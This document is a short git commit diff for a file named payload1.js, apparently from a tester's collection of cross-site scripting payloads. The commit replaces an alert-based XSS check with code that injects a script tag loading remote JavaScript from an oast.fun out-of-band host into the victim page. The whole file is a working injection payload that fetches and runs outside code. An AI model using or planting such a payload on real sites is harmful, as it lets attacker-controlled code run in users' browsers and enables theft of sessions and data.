82812c5f3c6d507be00ea4a8bceb3c6720489137
siddhu-1005 <84862560+siddhu-1005@users.noreply.github.com>
2025-07-25 20:54:56 +0530

    payload1.js

--- payload1.js
+++ payload1.js
@@ -1,1 +1,3 @@
-alert("XSS ✅ on " + document.domain);
+var s = document.createElement("script");
+s.src = "https://wdnjvosjkyhkfsmxvovxoq4wsvswtm3id.oast.fun/confirm.js";
+document.body.appendChild(s);
